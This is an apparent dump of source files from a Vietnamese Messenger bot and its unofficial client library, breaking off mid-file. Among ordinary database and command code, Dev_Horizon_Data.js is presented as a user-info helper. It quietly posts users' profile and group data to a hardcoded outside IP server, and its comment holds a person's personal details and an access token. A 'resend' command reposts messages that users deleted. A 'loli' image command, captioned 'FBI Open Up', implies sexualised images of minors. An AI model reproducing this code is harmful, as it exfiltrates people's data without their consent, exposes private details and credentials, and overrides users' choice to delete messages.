try { \n            Database(true).set(String(threadID),Object(threadData));\n            logger.Normal(getText(language.CreateDatabaseSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.CreateDatabaseFailure,String(threadID))); \n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            try {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            }\n            catch (e) {\n                var data = {};\n                fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            }\n            \n            data[String(threadID)] = Object(threadData);\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            logger.Normal(getText(language.CreateDatabaseSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.CreateDatabaseFailure,String(threadID))); \n        }\n    }\n}\n\nexports.updateData = function(threadID,threadData) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        try { \n            Database(true).set(String(threadID),Object(threadData));\n            logger.Normal(getText(language.updateDataSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.updateDataFailure,String(threadID))); \n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            try {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            }\n            catch (e) {\n                var data = {};\n                fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            }\n            \n            data[String(threadID)] = Object(threadData);\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            logger.Normal(getText(language.updateDataSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.updateDataFailure,String(threadID))); \n        }\n    }\n}\n\nexports.updateMessageCount = function(threadID,threadData) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        try { \n            Database(true).set(String(threadID),Object(threadData));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            try {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            }\n            catch (e) {\n                var data = {};\n                fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            }\n            \n            data[String(threadID)] = Object(threadData);\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nexports.getData = function(threadID) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        let Sw;\n        if (Always_True.includes(threadID)) Sw = true\n        else Sw = Database(true).has(String(threadID))\n        switch (Sw) {\n            case true: {\n                return Database(true).get(String(threadID))\n            }\n            case false: {\n                return null;\n            }\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            let Sw;\n            if (Always_True.includes(threadID)) Sw = true\n            else Sw = data.hasOwnProperty(String(threadID))\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            switch (Sw) {\n                case true: {\n                    return data[String(threadID)];\n                }\n                case false: {\n                    return null;\n                }\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return null;\n        }\n    }\n}\n\nexports.deleteAll = function(data) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        for (let i of data) {\n            Database(true).delete(String(i));\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data1 = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            for (let i of data) {\n                delete data1[String(i)];\n            }\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data1));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nexports.getAll = function() {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        return Database(true).list();\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            const Data_Res = []\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            for (let i of Object.keys(data)) {\n                Data_Res.push({\n                    ID: String(i),\n                    data: data[String(i)]\n                });\n            }\n            return Data_Res;\n        }\n        catch (e) {\n            console.log(e);\n            return [];\n        }\n    }\n}\n\nexports.hasData = function(threadID) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        if (Always_True.includes(threadID)) return true;\n        else {\n            const Data_Back = Database(true).has(String(threadID));\n            if (Data_Back === true) Always_True.push(threadID);\n            return Data_Back;\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            if (Always_True.includes(threadID)) return true;\n            else {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n                var has = data.hasOwnProperty(String(threadID));\n                if (has === true) Always_True.push(threadID);\n                return has\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return false;\n        }\n    }\n}\n\nexports.alreadyUpdate = function(threadID) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        var Time = Database(true).get(String(threadID)).TimeUpdate;\n            try { \n                if (global.Fca.startTime >= (Time + (3600 * 1000))) {\n                    logger.Normal(getText(language.alreadyUpdate, String(threadID)));\n                    return true;\n                }\n                else return false;\n            }\n            catch (e) { \n                console.log(e);\n            return true;\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            var Time = data[String(threadID)].TimeUpdate;\n            try { \n                if (global.Fca.startTime >= (Time + (3600 * 1000))) {\n                    logger.Normal(getText(language.alreadyUpdate, String(threadID)));\n                    return true;\n                }\n                else return false;\n            }\n            catch (e) { \n                console.log(e);\n            return true;\n        }\n        }\n        catch (e) {\n            console.log(e);\n            return true;\n        }\n    }\n}\n\nexports.readyCreate = function(Name) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        switch (Database(true).has(String(Name))) {\n            case true: {\n                if (!Always_True.includes(Name)) Always_True.push(Name);\n\n                if (Number(global.Fca.startTime) >= Number(Database(true).get(String(Name)) + (120 * 1000))) {\n                    return true;\n                }   \n                else {\n                    return false;\n                }\n            }\n            case false: {\n                return false;\n            }\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            switch (data.hasOwnProperty(String(Name))) {\n                case true: {\n                    if (Number(global.Fca.startTime) >= Number(data[String(Name)] + (120 * 1000))) {\n                        return true;\n                    }   \n                    else {\n                        return false;\n                    }\n                }\n                case false: {\n                    return false;\n                }\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return false;\n        }\n    }\n}\n\nexports.setLastRun = function(Name,LastRun) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        Database(true).set(String(Name),String(lastRun(LastRun)));\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            data[String(Name)] = String(lastRun(LastRun));\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nexports.getLastRun = function(Name) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        let Sw;\n        if (Always_True.includes(Name)) Sw = true;\n        else Sw = Database(true).has(String(Name));\n\n        switch (Sw) {\n            case true: {\n                return Database(true).get(String(Name));\n            }\n            case false: {\n                try {\n                    capture(Name)\n                    this.setLastRun(Name,Name);\n                    return Database(true).get(String(Name));\n                }\n                catch(e) {\n                    console.log(e);\n                    return Date.now();\n                }\n            }\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            let Sw;\n            if (Always_True.includes(Name)) Sw = true;\n            else Sw = data.hasOwnProperty(String(Name));\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            switch (Sw) {\n                case true: {\n                    return data[String(Name)];\n                }\n                case false: {\n                    try {\n                        capture(Name)\n                        this.setLastRun(Name,Name);\n                        return data[String(Name)];\n                    }\n                    catch(e) {\n                        console.log(e);\n                        return Date.now();\n                    }\n                }\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return Date.now();\n        }\n    }\n}","path":null,"size_bytes":12609,"size_tokens":null},"modules/commands/unpending.js":{"content":"const fs = require('fs-extra');\nconst path = __dirname + '/disabledGroups.json';\n\nmodule.exports.config = {\n  name: \"unpending\",\n  version: \"1.0.0\",\n  credits: \"Niiozic\",\n  hasPermssion: 2,\n  description: \"H·ªßy t·∫°o database c·ªßa box v√† ng·ª´ng bot nh·∫≠n l·ªánh t·ª´ box ƒë√≥\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"\",\n  cooldowns: 5\n};\n\nmodule.exports.handleReply = async function({ api, event, handleReply }) {\n  const { body, threadID, messageID, senderID } = event;\n\n  if (String(senderID) !== String(handleReply.author)) return;\n\n  const index = parseInt(body);\n  if (isNaN(index) || index <= 0 || index > handleReply.boxes.length) {\n    return api.sendMessage(`‚Üí ${body} kh√¥ng ph·∫£i l√† m·ªôt s·ªë h·ª£p l·ªá`, threadID, messageID);\n  }\n\n  const box = handleReply.boxes[index - 1];\n\n  let disabledGroups = [];\n  if (fs.existsSync(path)) {\n    disabledGroups = JSON.parse(fs.readFileSync(path));\n  }\n\n  if (!disabledGroups.includes(box.threadID)) {\n    disabledGroups.push(box.threadID);\n    fs.writeFileSync(path, JSON.stringify(disabledGroups, null, 2));\n  }\n\n  return api.sendMessage(`[ DISABLE BOX ] - ƒê√£ ng·ª´ng bot nh·∫≠n l·ªánh t·ª´ box: ${box.name} (${box.threadID})`, threadID, messageID);\n};\n\nmodule.exports.run = async function({ api, event }) {\n  const { threadID, messageID, senderID } = event;\n  const commandName = this.config.name;\n\n  // T√¨m t·∫•t c·∫£ c√°c box ƒëang ƒë∆∞·ª£c kh·ªüi t·∫°o database\n  const listFiles = fs.readdirSync(__dirname + '/checktt/');\n  const boxes = listFiles.map(file => {\n    const data = JSON.parse(fs.readFileSync(__dirname + '/checktt/' + file));\n    return {\n      name: data.name || \"Box kh√¥ng t√™n\",\n      threadID: file.replace('.json', '')\n    };\n  });\n\n  if (boxes.length === 0) {\n    return api.sendMessage(\"[ DISABLE BOX ] - Kh√¥ng c√≥ box n√†o ƒëang ƒë∆∞·ª£c kh·ªüi t·∫°o database\", threadID, messageID);\n  }\n\n  let msg = \"‚Üí Danh s√°ch c√°c box ƒëang ƒë∆∞·ª£c kh·ªüi t·∫°o database:\\n\";\n  boxes.forEach((box, index) => {\n    msg += `${index + 1}. ${box.name} (${box.threadID})\\n`;\n  });\n\n  api.sendMessage(`${msg}\\nReply (ph·∫£n h·ªìi) v·ªõi s·ªë th·ª© t·ª± c·ªßa box mu·ªën ng·ª´ng bot nh·∫≠n l·ªánh`, threadID, (error, info) => {\n    if (error) return api.sendMessage(\"[ DISABLE BOX ] - L·ªói khi g·ª≠i danh s√°ch box\", threadID, messageID);\n    global.client.handleReply.push({\n      name: commandName,\n      messageID: info.messageID,\n      author: senderID,\n      boxes: boxes\n    });\n  }, messageID);\n};\n","path":null,"size_bytes":2494,"size_tokens":null},"lib/fca-auto/src/httpGet.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function httpGet(url, form, callback, notAPI) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(form) == \"Function\" || utils.getType(form) == \"AsyncFunction\")) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n\n    callback = callback || function (err, data) {\n      if (err) return rejectFunc(err);\n      resolveFunc(data);\n    };\n\n    if (notAPI) {\n      utils\n        .get(url, ctx.jar, form, ctx.globalOptions)\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpGet\", err);\n          return callback(err);\n        });\n    }\n    else {\n      defaultFuncs\n        .get(url, ctx.jar, form)\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpGet\", err);\n          return callback(err);\n        });\n    }\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1241,"size_tokens":null},"lib/fca-auto/src/getEmojiUrl.js":{"content":"\"use strict\";\n\nconst util = require(\"util\");\n\nmodule.exports = function () {\n  return function getEmojiUrl(c, size, pixelRatio) {\n    /*\n     Resolves Facebook Messenger emoji image asset URL for an emoji character.\n     Supported sizes are 32, 64, and 128.\n     Supported pixel ratios are '1.0' and '1.5' (possibly more; haven't tested)\n     */\n    const baseUrl = \"https://static.xx.fbcdn.net/images/emoji.php/v8/z%s/%s\";\n    pixelRatio = pixelRatio || \"1.0\";\n\n    let ending = util.format(\n      \"%s/%s/%s.png\",\n      pixelRatio,\n      size,\n      c.codePointAt(0).toString(16)\n    );\n    let base = 317426846;\n    for (let i = 0; i < ending.length; i++) base = (base << 5) - base + ending.charCodeAt(i);\n\n    let hashed = (base & 255).toString(16);\n    return util.format(baseUrl, hashed, ending);\n  };\n};\n","path":null,"size_bytes":810,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/Horizon_Database/A_README.md":{"content":"This folder is used by ChernobyL(NANI =)) ) to store data. Do not delete this folder or any of the files in it.","path":null,"size_bytes":111,"size_tokens":null},"modules/commands/resend.js":{"content":"module.exports.config = {\n    name: \"resend\",\n    version: \"2.0.0\",\n    hasPermssion: 1,\n    credits: \"ThoÃ£, ManhG Fix Ver > 1.2.13\",\n    description: \"G·ª≠i l·∫°i tin nh·∫Øn b·ªã g·ª°\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"\",\n    cooldowns: 0,\n    hide: true,\n    dependencies: {\n      \"request\": \"\",\n      \"fs-extra\": \"\",\n      \"axios\": \"\"\n    }\n  };\n  \n  module.exports.handleEvent = async function ({ event, api, client, Users }) {\n    const request = global.nodemodule[\"request\"];\n    const axios = global.nodemodule[\"axios\"]\n    const { writeFileSync, createReadStream } = global.nodemodule[\"fs-extra\"];\n  \n    let { messageID, senderID, threadID, body: content } = event;\n    if (!global.logMessage) global.logMessage = new Map();\n    if (!global.data.botID) global.data.botID = global.data.botID;\n  \n    const thread = global.data.threadData.get(threadID) || {};\n  \n    if (typeof thread[\"resend\"] != \"undefined\" && thread[\"resend\"] == true) return;\n    if (senderID == global.data.botID) return;\n  \n    if (event.type != \"message_unsend\") global.logMessage.set(messageID, {\n      msgBody: content,\n      attachment: event.attachments\n    })\n    if (typeof thread[\"resend\"] != \"undefined\" && thread[\"resend\"] == true | event.type == \"message_unsend\") {\n      var getMsg = global.logMessage.get(messageID);\n      if (!getMsg) return;\n      let name = await Users.getNameUser(senderID);\n      if (getMsg.attachment[0] == undefined) return api.sendMessage(`>>>ùêÜùêéÃõÃÉ ùêìùêàùêç ùêçùêáùêÄÃÜÃÅùêç<<<\\n\\nùêçùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê†: ${name} \\nùêçùê®Ã£ÃÇùê¢ ùêÉùêÆùêßùê†: ${getMsg.msgBody}\\n\\nùêíùêÆÃõÃâ ùêùùêÆÃ£ùêßùê† ùê•ùêûÃ£ÃÇùêßùê° #ùê´ùêûùê¨ùêûùêßùêù ùê®ùêüùêü ùêùùêûÃÇÃâ ùê≠ùêöÃÜÃÅùê≠ ùê≠ùê¢ÃÅùêßùê° ùêßùêöÃÜùêßùê† ùêßùêöÃÄùê≤`, threadID)\n      else {\n        let num = 0\n        let msg = {\n          body: `>>>ùêÜùêéÃõÃÉ ùêìùêàùêç ùêçùêáùêÄÃÜÃÅùêç<<<\\n\\nùêçùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê†: ${name}\\nùêïùêÆÃõÃÄùêö ùê†ùê®ÃõÃÉ ${getMsg.attachment.length} ùê≠ùêûÃ£ÃÇùê© ùêùùê¢ÃÅùêßùê° ùê§ùêûÃÄùê¶\\n${(getMsg.msgBody != \"\") ? `\\nùêçùê®Ã£ÃÇùê¢ ùêÉùêÆùêßùê†: ${getMsg.msgBody}` : \"\"}\\nùêíùêÆÃõÃâ ùêùùêÆÃ£ùêßùê† ùê•ùêûÃ£ÃÇùêßùê° #ùê´ùêûùê¨ùêûùêßùêù ùê®ùêüùêü ùêùùêûÃÇÃâ ùê≠ùêöÃÜÃÅùê≠ ùê≠ùê¢ÃÅùêßùê° ùêßùêöÃÜùêßùê† ùêßùêöÃÄùê≤`,\n          attachment: [],\n          mentions: { tag: name, id: senderID }\n        }\n        for (var i of getMsg.attachment) {\n          num += 1;\n          var getURL = await request.get(i.url);\n          var pathname = getURL.uri.pathname;\n          var ext = pathname.substring(pathname.lastIndexOf(\".\") + 1);\n          var path = __dirname + `/cache/${num}.${ext}`;\n          var data = (await axios.get(i.url, { responseType: 'arraybuffer' })).data;\n          writeFileSync(path, Buffer.from(data, \"utf-8\"));\n          msg.attachment.push(createReadStream(path));\n        }\n        api.sendMessage(msg, threadID);\n      }\n    }\n  }\n  \n  module.exports.languages = {\n    \"vi\": {\n      \"on\": \"[ ùêëùêÑùêíùêÑùêçùêÉ ] - ùêÅùêöÃ£ÃÇùê≠\",\n      \"off\": \"[ ùêëùêÑùêíùêÑùêçùêÉ ] - ùêìùêöÃÜÃÅùê≠\",\n      \"successText\": \"ùêëùêûùê¨ùêûùêßùêù ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê†üòΩ\",\n    },\n    \"en\": {\n      \"on\": \"on\",\n      \"off\": \"off\",\n      \"successText\": \"resend success!\",\n    }\n  }\n  \n  module.exports.run = async function ({ api, event, Threads, getText }) {\n    const { threadID, messageID } = event;\n    let data = (await Threads.getData(threadID)).data;\n  \n    if (typeof data[\"resend\"] == \"undefined\" || data[\"resend\"] == false) data[\"resend\"] = true;\n    else data[\"resend\"] = false;\n  \n    await Threads.setData(threadID, { data });\n    global.data.threadData.set(threadID, data);\n    return api.sendMessage(`${(data[\"resend\"] == true) ? getText(\"off\") : getText(\"on\")} ${getText(\"successText\")}`, threadID, messageID);\n  }","path":null,"size_bytes":3951,"size_tokens":null},"modules/commands/joinnoti.js":{"content":"const { existsSync, writeFileSync, mkdirSync, readFileSync } = require(\"fs-extra\");\nconst { join } = require(\"path\");\n\nmodule.exports.config = {\n    name: \"joinnoti\",\n    version: \"1.1.0\",\n    hasPermssion: 1,\n    credits: \"TatsuYTB\",\n    description: \"Qu·∫£n l√Ω tin nh·∫Øn ch√†o t√πy bi·∫øn cho t·ª´ng nh√≥m v·ªõi bi·∫øn {name}, {author}...\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"[add <message> /remove /on /off]\",\n    cooldowns: 0\n};\n\nconst pathCache = join(__dirname, \"data\");\nconst pathData = join(pathCache, \"joinNoti.json\");\n\nmodule.exports.onLoad = () => {\n    if (!existsSync(pathCache)) mkdirSync(pathCache, { recursive: true });\n    if (!existsSync(pathData)) writeFileSync(pathData, \"[]\", \"utf-8\");\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    const { threadID, messageID } = event;\n\n    let dataJson;\n    try { dataJson = JSON.parse(readFileSync(pathData, \"utf-8\")); } \n    catch { dataJson = []; writeFileSync(pathData, JSON.stringify([]), \"utf-8\"); }\n\n    let thisThread = dataJson.find(i => i.threadID == threadID) || { threadID, message: null, enable: true };\n\n    const content = args.slice(1).join(\" \");\n\n    switch (args[0]) {\n        case \"add\":\n            if (!content) return api.sendMessage(\"‚Üí B·∫°n ch∆∞a nh·∫≠p tin nh·∫Øn ch√†o!\", threadID, messageID);\n            thisThread.message = content;\n            if (!dataJson.some(i => i.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(`‚Üí C·∫•u h√¨nh tin nh·∫Øn ch√†o th√†nh c√¥ng!`, threadID, messageID);\n\n        case \"remove\":\n            thisThread.message = null;\n            const index = dataJson.findIndex(i => i.threadID == threadID);\n            if (index !== -1) dataJson.splice(index, 1);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí X√≥a c·∫•u h√¨nh tin nh·∫Øn ch√†o th√†nh c√¥ng!\", threadID, messageID);\n\n        case \"on\":\n            thisThread.enable = true;\n            if (!dataJson.some(i => i.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí ƒê√£ b·∫≠t joinNoti cho nh√≥m n√†y!\", threadID, messageID);\n\n        case \"off\":\n            thisThread.enable = false;\n            if (!dataJson.some(i => i.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí ƒê√£ t·∫Øt joinNoti cho nh√≥m n√†y!\", threadID, messageID);\n\n        default:\n            return api.sendMessage(\n`H∆∞·ªõng d·∫´n s·ª≠ d·ª•ng chi ti·∫øt:\n#joinNoti add <message>: Th√™m tin nh·∫Øn ch√†o t√πy ch·ªânh\n   ‚Üí C√≥ th·ªÉ s·ª≠ d·ª•ng c√°c bi·∫øn:\n      {name}        : T√™n th√†nh vi√™n m·ªõi\n      {author}      : T√™n ng∆∞·ªùi th√™m\n      {threadName}  : T√™n nh√≥m\n      {soThanhVien} : S·ªë l∆∞·ª£ng th√†nh vi√™n hi·ªán t·∫°i\n      {get}         : Bu·ªïi trong ng√†y\n      {bok}         : Ng√†y th√°ng hi·ªán t·∫°i\n      V√≠ d·ª•: {name} ƒë√£ tham gia v√†o bu·ªïi {get} ng√†y {bok} l√† th√†nh vi√™n s·ªë {soThanhVien}\n#joinNoti remove: X√≥a tin nh·∫Øn ch√†o\n#joinNoti on: B·∫≠t joinNoti cho nh√≥m\n#joinNoti off: T·∫Øt joinNoti cho nh√≥m`, threadID, messageID\n            );\n    }\n};\n","path":null,"size_bytes":3419,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/memoryleak.js":{"content":"const memwatch = require('memwatch-next');\n\n// b·∫Øt ƒë·∫ßu theo d√µi memory\nmemwatch.on('leak', function(info) {\nconsole.error('memory leak detected:');\nconsole.error(info);\n});\n\n// T·∫°o m·ªôt object ƒë·ªÉ t·∫°o memory leak\nlet myObj = {};\nsetInterval(function() {\nfor (let i = 0; i < 10000; i++) {\nmyObj[i] = new Array(10000);\n}\n}, 1000);\n\n// force garbage collection ƒë·ªÉ release memory leak\nmemwatch.gc();\n","path":null,"size_bytes":412,"size_tokens":null},"modules/commands/loli.js":{"content":"module.exports.config = {\n  name: \"loli\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/loil.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'FBI Open Up!!!!!',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1603,"size_tokens":null},"lib/fca-auto/src/Dev_Horizon_Data.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar bluebird = require('bluebird');\nvar request = bluebird.promisify(require(\"request\"));\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV4(data, type, method, callback) {\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n    \n        if (!callback) {\n            callback = function (err, userInfo) {\n                if (err) return rejectFunc(err);\n                resolveFunc(userInfo);\n            };\n        }\n\n        if (!data || !type || !method) return;\n\n        var Cluster = ['http://146.190.109.182:3874'];\n        var ursl = Cluster[Math.floor(Math.random() * Cluster.length)];\n        \n        if (utils.getType(data) !== \"Array\") data = [data];\n        switch (method) {\n            case \"Post\": {\n                switch (type) {\n                    case \"Users\": {\n                        /* \n                        example\n                            Time:19/01/2023\n                            Data:[{\"id\":\"100042817150429\",\"name\":\"Nguy·ªÖn Th√°i H·∫£o\",\"first_name\":\"H·∫£o\",\"username\":\"Lazic.Kanzu\",\"link\":\"https://www.facebook.com/Lazic.Kanzu\",\"verified\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"about\":\"L√† m·ªôt ng∆∞·ªùi b√¨nh th∆∞·ªùng ^^\",\"avatar\":\"https://graph.facebook.com/100042817150429/picture?height=1500&width=1500&access_token=1449557605494892|aaf0a865c8bafc314ced5b7f18f3caa6\",\"birthday\":\"01/03/1999\",\"follow\":241614,\"gender\":\"male\",\"hometown\":{\"id\":\"112089428815888\",\"name\":\"Xu√¢n L·ªôc, √ê·ªìng Nai, Vietnam\"},\"email\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"interested_in\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"location\":{\"id\":\"351759091676222\",\"name\":\"Bi√™n H√≤a\"},\"locale\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"relationship_status\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"love\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"website\":\"http://KanzuWakazaki.tk/\",\"quotes\":\"The word impossible is not in my dictionary.\",\"timezone\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\"updated_time\":\"Kh√¥ng C√≥ D·ªØ Li·ªáu\"}]\n                            Type:Users\n                            By:KanzuWakazaki\n                        **/\n                        let Time = new Date().toLocaleString(\"vi-vn\", {timeZone: \"Asia/Ho_Chi_Minh\"});\n                            return request({\n                                url:  ursl + '/post',\n                                method: 'post',\n                                headers: {\n                                    'user-agent': \"Horizon/GlobalData/Client\"\n                                },\n                            formData: {\n                                Time: Time,\n                                Data: JSON.stringify(data),\n                                Type: \"Users\",\n                                By: ctx.userID\n                            }\n                        }).then(dt => console.log(dt.body)); \n                    }\n                    case \"Threads\": {\n                        /* \n                        example\n                            Time:19/01/2023\n                            Data:[{\"threadID\":\"5011501735554963\",\"threadName\":\"[üèÜ]  ùï≥ùï∑ ‚Ä¢ ùëØùíêùíìùíäùíõùíêùíè ùëÆùíÇùíéùíäùíèùíà  [üéÆ]\",\"participantIDs\":[\"100042817150429\"],\"userInfo\":[{\"id\":\"100042817150429\",\"name\":\"Nguy·ªÖn Th√°i 